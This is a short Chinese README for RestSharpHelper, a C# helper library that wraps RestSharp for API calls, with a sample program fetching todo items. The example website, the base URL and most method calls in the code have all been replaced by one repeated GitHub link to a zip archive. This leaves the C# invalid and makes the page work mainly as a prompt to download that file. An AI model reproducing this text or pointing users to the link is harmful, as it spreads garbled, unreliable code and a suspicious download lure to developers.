### 简介
RestSharpHelper是一个使用RestSharp项目，作为二次封装，方便集成Api调用的辅助类，同时提供在Api调用各阶段事件回调和返回数据二次处理。

### 使用方法
下面以网站 [https://github.com/usteinfo/RestSharpHelper/raw/refs/heads/main/RestSharpHelper/Sharp-Helper-Rest-3.9-alpha.1.zip](https://github.com/usteinfo/RestSharpHelper/raw/refs/heads/main/RestSharpHelper/Sharp-Helper-Rest-3.9-alpha.1.zip) 的todo数据为例示例：

```csharp
class Program
{
    public static void Main(string[] args)
    {
        var restSharpHelper = GetRestSharpHelper();
        var result = https://github.com/usteinfo/RestSharpHelper/raw/refs/heads/main/RestSharpHelper/Sharp-Helper-Rest-3.9-alpha.1.zip<Todo>("/todos/1");
        https://github.com/usteinfo/RestSharpHelper/raw/refs/heads/main/RestSharpHelper/Sharp-Helper-Rest-3.9-alpha.1.zip(p =>
        {
            https://github.com/usteinfo/RestSharpHelper/raw/refs/heads/main/RestSharpHelper/Sharp-Helper-Rest-3.9-alpha.1.zip(1, https://github.com/usteinfo/RestSharpHelper/raw/refs/heads/main/RestSharpHelper/Sharp-Helper-Rest-3.9-alpha.1.zip);
        });
        https://github.com/usteinfo/RestSharpHelper/raw/refs/heads/main/RestSharpHelper/Sharp-Helper-Rest-3.9-alpha.1.zip();
    }
    private static RestSharpHelper GetRestSharpHelper()
    {
        return new RestSharpHelper("https://github.com/usteinfo/RestSharpHelper/raw/refs/heads/main/RestSharpHelper/Sharp-Helper-Rest-3.9-alpha.1.zip");
    }
}
public class Todo
{
    public int userId { get; set; }
    public int id { get; set; }
    public string title { get; set; }
    public bool completed { get; set; }
}
 
```